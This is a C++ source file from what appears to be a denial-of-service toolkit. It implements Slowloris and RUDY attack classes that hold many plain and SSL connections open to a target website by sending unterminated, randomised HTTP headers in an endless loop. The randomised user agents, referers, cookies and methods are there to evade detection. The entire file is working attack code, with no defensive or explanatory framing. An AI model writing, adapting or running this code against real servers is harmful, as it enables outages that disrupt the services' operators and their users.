#include <netdb.h>
#include <cstring>
#include <utility>
#include <openssl/ssl.h>

#include "../Headers/Slowloris.hpp"

void Slowloris::attack(const int *id) {
    int r;
    std::vector<int> sockets;
    sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.emplace_back(0);
    }
    while(true) {
        static std::string message;
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            httphdr header{};
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                init_header(&header);
            }

            if((r = write_socket(sockets[x], header.get().c_str(), static_cast<int>(header.length()))) == -1){
                cleanup(&sockets[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                init_header(&header);
            }else{
                header.overide(const_cast<std::string &>(Randomizer::randomstr()));
                if(conf->GetResponse){
                    read_socket(sockets[x]);
                }
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                conf->logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                conf->logger->Log(&message, Logger::Info);
            }
        }
        message = std::to_string(*id) + ": Voly Sent";
        conf->logger->Log(&message, Logger::Info);
        pause();
    }
}

void Slowloris::attack_ssl(const int *id) {
    int r;
    std::vector<int> sockets;
    std::vector<SSL_CTX *> CTXs;
    std::vector<SSL *> SSLs;
    sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    CTXs.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    SSLs.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.emplace_back(0);
        SSLs.emplace_back(nullptr);
        CTXs.emplace_back(nullptr);
    }
    while(true) {
        static std::string message;
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            httphdr header{};
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
                init_header(&header);
            }

            if((r = write_socket(SSLs[x], header.get().c_str(), static_cast<int>(header.length()))) == -1){
                cleanup(SSLs[x], &sockets[x], CTXs[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
                init_header(&header);
            }else{
                header.overide(const_cast<std::string &>(Randomizer::randomstr()));
                if(conf->GetResponse){
                    read_socket(SSLs[x]);
                }
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                conf->logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                conf->logger->Log(&message, Logger::Info);
            }
        }
        message = std::to_string(*id) + ": Voly Sent";
        conf->logger->Log(&message, Logger::Info);
        pause();
    }
}

Slowloris::Slowloris(std::shared_ptr<Config> conf) : Http_Flood(std::move(conf)) {

}

void Slowloris::init_header(httphdr *header) {

    switch (conf->vector){
        case Config::Slowloris:
            header->method = Randomizer::random_method();
            break;
        case Config::Rudy:
            header->method = "POST";
            header->content_length = Randomizer::randomInt(100000000, 1000000000);
            break;
        default:break;
    }
    if(conf->RandomizeHeader){
        header->location = Randomizer::randomstr();
    }
    header->useragent = Randomizer::random_useragent(*(conf->useragents));
    header->cache_control = Randomizer::random_caching();
    header->encoding = Randomizer::random_encoding();
    header->charset = {Randomizer::random_charset(), Randomizer::random_charset()};
    header->referer = Randomizer::random_referer();
    header->accept = "*/*";
    header->connection_type = "Keep-Alive";
    header->content_type = Randomizer::random_contenttype();
    header->cookie = {Randomizer::randomstr(), Randomizer::randomstr()};
    header->keep_alive = Randomizer::randomInt(1, 5000);
    header->DNT = Randomizer::randomInt(0, 1);

    header->generate_unterminated();

}

